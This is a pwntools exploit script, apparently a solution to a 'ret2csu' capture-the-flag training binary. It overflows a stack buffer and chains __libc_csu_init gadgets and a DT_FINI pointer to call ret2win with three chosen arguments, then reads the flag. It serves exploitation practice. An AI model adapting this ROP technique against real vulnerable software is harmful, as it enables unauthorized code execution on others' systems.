from pwn import *

BINARY = "./ret2csu"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

"""
---------- OBJECTIVE ----------
call ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

RDI = 0xdeadbeefdeadbeef
RSI = 0xcafebabecafebabe
RDX = 0xd00df00dd00df00d

---------- csu_pop GADGET ----------
0x40069A   pop rbx
0x40069B   pop rbp
0x40069C   pop r12
0x40069E   pop r13
0x4006A0   pop r14
0x4006A2   pop r15
0x4006A4   retn


---------- csu_call GADGET ----------
0x400680   mov rdx, r15
0x400683   mov rsi, r14
0x400686   mov edi, r13d
0x400689   call QWORD PTR [r12 + rbx*8]


---------- Elf64_Dyn STRUCTURE -----------
00000000  Elf64_Dyn struc ; (sizeof=0x10, align=0x8, copyof_3)
00000000  d_tag   dq ?
00000008  d_un    dq ?
00000010  Elf64_Dyn ends


---------- Elf64_Dyn GADGET ----------
0x600E40   Elf64_Dyn <0Dh, 4006B4h>  ; DT_FINI
--> 0x4006B4   sub rsp, 8
--> 0x4006B8   add rsp, 8
--> 0x4006BC   retn
"""

csu_pop   = p64(0x40069A)
csu_call  = p64(0x400680)
pop_rdi   = p64(0x4006a3) # pop rdi ; ret
dt_fini   = p64(0x600E48)

p = process(BINARY)

rop = b"A" * 40

# Calling csu_pop to prepare the use of csu_call gadget
rop += csu_pop
rop += p64(0) # RBX value to have [r12 + rbx*8] == [r12]
rop += p64(1) # EBP value to 1 to avoid conditionnal jump after "test ebp, ebp"
rop += dt_fini # deferencable function pointer
rop += p64(0xdeadbeefdeadbeef) # r13 value (to prepare "mov edi, r13d" in csu_call)
rop += p64(0xcafebabecafebabe) # r14 value (to prepare "mov rsi, r14" in csu_call)
rop += p64(0xd00df00dd00df00d) # r15 value (to prepare "mov rdx, r15" in csu_cal)

# Calling csu_call while keeping the stack aligned
rop += csu_call
rop += p64(0)
rop += p64(0) # EBP value to 0 to take the conditionnal jump after "test ebp, ebp"
rop += p64(0)
rop += p64(0)
rop += p64(0)
rop += p64(0)
rop += p64(0)

# RDI = 0xdeadbeefdeadbeef
# Because csu_pop gadget only put content of r13d in edi (rdi = 0xdeadbeef instead of 0xdeadbeefdeadbeef)
rop += pop_rdi
rop += p64(0xdeadbeefdeadbeef)

# Calling ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
rop += p64(ELF.symbols["ret2win"])

log.success(f"ROP chain : {rop}")
# pause() --> pause execution to debug with 'gdb -p <PID>'
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
